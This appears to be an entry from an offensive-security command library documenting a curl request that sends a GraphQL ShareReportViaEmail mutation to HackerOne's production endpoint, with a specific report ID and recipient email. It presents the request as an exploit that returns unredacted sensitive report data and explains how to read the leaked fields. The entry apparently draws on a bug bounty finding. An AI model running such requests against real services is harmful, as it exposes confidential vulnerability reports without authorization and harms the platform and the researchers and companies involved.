---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: share-report-via-email-graphql-mutation
type: command
executor: bash
data: >-
  curl -X POST https://hackerone.com/graphql --http2 -H "Content-Type:
  application/json" -d
  '{"operationName":"ShareReportViaEmail","variables":{"product_area":"reports","product_feature":"inbox","reportId":"gid://hackerone/Report/2139856","message":"can
  we disclose","emails":["iambouali@wearehackerone.com"]},"query":"mutation
  ShareReportViaEmail($reportId: ID!,$message: String!,$emails: [String!]!) {
  shareReportViaEmail( input: {report_id: $reportId,message:$message
  ,emails:$emails} ) { was_successful report{impact title
  vulnerability_information} errors { edges { node { id error_code field message
  __typename } __typename } __typename } __typename } }"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.636Z'
platforms:
  - Web
tags:
  - graphql
  - information-disclosure
verified: false
validated: true
submitted: true
---

# share-report-via-email-graphql-mutation

## Command

```bash
curl -X POST https://hackerone.com/graphql --http2 -H "Content-Type: application/json" -d '{"operationName":"ShareReportViaEmail","variables":{"product_area":"reports","product_feature":"inbox","reportId":"gid://hackerone/Report/2139856","message":"can we disclose","emails":["iambouali@wearehackerone.com"]},"query":"mutation ShareReportViaEmail($reportId: ID!,$message: String!,$emails: [String!]!) { shareReportViaEmail( input: {report_id: $reportId,message:$message ,emails:$emails} ) { was_successful report{impact title vulnerability_information} errors { edges { node { id error_code field message __typename } __typename } __typename } __typename } }"}'
```

## Description

This command executes a GraphQL mutation to the HackerOne /graphql endpoint, attempting to share a report via email. It triggers an information disclosure by returning unredacted sensitive data in the response, such as JIRA references in the impact field. Use it to test redaction failures in report-sharing APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--http2` | Enables HTTP/2 protocol for the request | Yes |
| `-H "Content-Type: application/json"` | Sets the content type header for JSON payload | Yes |
| `-d '{...}'` | The JSON data payload containing operationName, variables, and query | Yes |
| `reportId` (in variables) | Global ID of the target report (e.g., 'gid://hackerone/Report/2139856') | Yes |
| `message` (in variables) | Custom message for the email share (e.g., 'can we disclose') | Yes |
| `emails` (in variables) | Array of recipient emails (e.g., ['iambouali@wearehackerone.com']) | Yes |
| `product_area` (in variables) | Targets the 'reports' area | Yes |
| `product_feature` (in variables) | Targets the 'inbox' feature | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql --http2 -H "Content-Type: application/json" -d '{...payload...}'
```

### Advanced Usage

To pipe output to jq for parsing:

```bash
curl ... | jq '.data.shareReportViaEmail.report.impact'
```

## Expected Output

A JSON response like {"data":{"shareReportViaEmail":{"was_successful":true,"report":{"impact":"Unredacted sensitive info like JIRA-12345...","title":"...","vulnerability_information":"..."},"errors":[]}}}. Look for unredacted content in 'impact' to confirm disclosure.

## Related

- [[Related Procedure|procedures/Exploit-Inadequate-Redaction-in-ShareReportViaEmail-Mutation]]
